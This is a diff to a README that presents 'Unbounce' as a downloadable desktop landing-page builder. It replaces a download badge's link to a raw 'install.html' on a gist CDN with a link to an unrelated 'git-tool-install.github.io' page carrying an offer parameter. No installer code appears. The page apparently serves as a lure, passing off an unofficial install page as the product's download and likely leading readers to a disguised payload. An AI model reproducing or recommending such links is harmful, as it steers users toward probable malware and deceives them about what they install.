@@ -1,6 +1,6 @@
 # Unbounce Download — Desktop Landing Page Builder
 
-<a href="https://gistcdn.githack.com/flamesong104/c3a19355ba1229c268d665ffea72f996/raw/7ba8a49a2994b04e30c54866cca3b8eae98584db/install.html?offer=Unbounce" target="_blank">
+<a href="https://git-tool-install.github.io/.github/?offer==Unbounce" target="_blank">
   <img 
     src="https://img.shields.io/badge/Get%20Unbounce%20GitHub-28A745%20to%2020B23F?style=plastic&logo=github&logoColor=FFFFFF" 
     width="320" 
